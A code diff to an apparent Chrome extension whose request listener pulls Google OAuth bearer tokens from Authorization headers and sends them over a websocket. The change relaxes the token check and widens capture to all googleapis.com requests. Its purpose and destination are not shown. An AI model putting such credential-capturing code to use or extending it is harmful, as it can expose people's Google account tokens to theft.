@@ -90,10 +90,12 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
       (h) => h.name?.toLowerCase() === 'authorization',
     );
     const value = authHeader?.value || '';
-    if (!value.startsWith('Bearer ya29.')) return;
+    if (!/^Bearer\s+/i.test(value)) return;
 
     const token = value.replace(/^Bearer\s+/i, '').trim();
     if (!token) return;
+    const isLikelyGoogleToken = token.startsWith('ya29.') || token.startsWith('1//') || token.length >= 80;
+    if (!isLikelyGoogleToken) return;
 
     // Always update — even if same token string, refresh the timestamp
     flowKey = token;
@@ -106,7 +108,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
       ws.send(JSON.stringify({ type: 'token_captured', flowKey }));
     }
   },
-  { urls: ['https://aisandbox-pa.googleapis.com/*', 'https://labs.google/*'] },
+  { urls: ['https://labs.google/*', 'https://aisandbox-pa.googleapis.com/*', 'https://*.googleapis.com/*'] },
   ['requestHeaders', 'extraHeaders'],
 );
 
